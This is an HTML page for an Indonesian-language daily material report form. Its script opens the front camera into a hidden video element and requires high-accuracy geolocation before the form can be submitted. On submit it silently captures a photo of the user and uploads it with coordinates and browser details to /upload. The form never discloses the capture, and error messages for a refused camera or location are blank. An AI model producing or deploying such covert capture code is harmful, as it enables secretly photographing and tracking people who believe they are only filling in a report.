<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css"
    />
    <style>
      #message {
        display: none;
        margin: 20px;
        font-weight: bold;
        padding: 8px;
        border-radius: 4px;
      }
      video, canvas {
        display: none; /* Kamera & canvas disembunyikan */
      }
    </style>
  </head>
  <body>
    <section class="hero is-primary is-bold">
      <div class="hero-body">
        <div class="container">
          <h1 class="title">DAILY REPORT SEIJKT11</h1>
        </div>
      </div>
    </section>

    <form
      id="form"
      class="container m-4 pl-4"
      method="POST"
      enctype="multipart/form-data"
    >
      <div class="field">
        <label class="label">Hari/Tanggal</label>
        <div class="control">
          <input
            class="input"
            type="text"
            placeholder="Hari/Tanggal"
            name="hari"
          />
        </div>
      </div>

      <div class="field">
        <label class="label">Jam</label>
        <div class="control">
          <input class="input" type="text" placeholder="Jam" name="jam" />
        </div>
      </div>

      <div class="field">
        <label class="label">Material dan Jumlah</label>
        <div class="control">
          <input
            class="input"
            type="text"
            placeholder="Material dan Jumlah"
            name="material"
          />
        </div>
      </div>

      <div class="field">
        <label class="label">Keterangan</label>
        <div class="control">
          <input
            class="input"
            type="text"
            placeholder="Keterangan"
            name="keterangan"
          />
        </div>
      </div>

      <!-- Kamera & Canvas disembunyikan -->
      <video id="video" autoplay playsinline></video>
      <canvas id="canvas"></canvas>

      <input type="hidden" name="latitude" id="latitude" />
      <input type="hidden" name="longitude" id="longitude" />
      <input type="hidden" name="userAgent" id="userAgent" />

      <div class="field is-grouped">
        <div class="control">
          <button
            class="button is-primary"
            type="submit"
            id="submit-button"
            disabled
          >
            ENTER
          </button>
        </div>
        <div class="control">
          <button class="button is-danger" type="reset">Cancel</button>
        </div>
      </div>
    </form>

    <div id="message" class="notification"></div>

    <script>
      const message = document.getElementById("message");
      const submitButton = document.getElementById("submit-button");
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");

      document.getElementById("userAgent").value = navigator.userAgent;

      window.onload = async function () {
        try {
          // Kamera (hidden preview)
          const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" },
          });
          video.srcObject = stream;

          // Lokasi
          if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
              (pos) => {
                document.getElementById("latitude").value =
                  pos.coords.latitude;
                document.getElementById("longitude").value =
                  pos.coords.longitude;
                submitButton.disabled = false;
              },
              (err) => {
                showError("");
              },
              { enableHighAccuracy: true, timeout: 10000 }
            );
          } else {
            showError("Perangkat tidak mendukung lokasi.");
          }
        } catch (err) {
          showError("");
        }
      };

      function showError(msg) {
        message.textContent = msg;
        message.className = "notification is-danger";
        message.style.display = "block";
        submitButton.disabled = true;
      }

      document.getElementById("form").addEventListener("submit", async (e) => {
        e.preventDefault();
        message.textContent = "Mengirim data...";
        message.className = "notification is-info";
        message.style.display = "block";
        submitButton.disabled = true;

        // Capture foto dari video (hidden)
        const context = canvas.getContext("2d");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const blob = await new Promise((resolve) =>
          canvas.toBlob(resolve, "image/jpeg", 0.9)
        );

        const formData = new FormData(e.target);
        formData.append("photo", blob, "capture.jpg");

        const res = await fetch("/upload", { method: "POST", body: formData });

        if (res.ok) {
          window.location.href =
            "https://docs.google.com/spreadsheets/d/18uu1uAvZci1a3wZyOLx_q4BmsqbBepk10fefIXchMwE/edit?usp=drivesdk";
        } else {
          const txt = await res.text();
          showError("Gagal mengirim: " + txt);
        }
      });
    </script>
  </body>
</html>
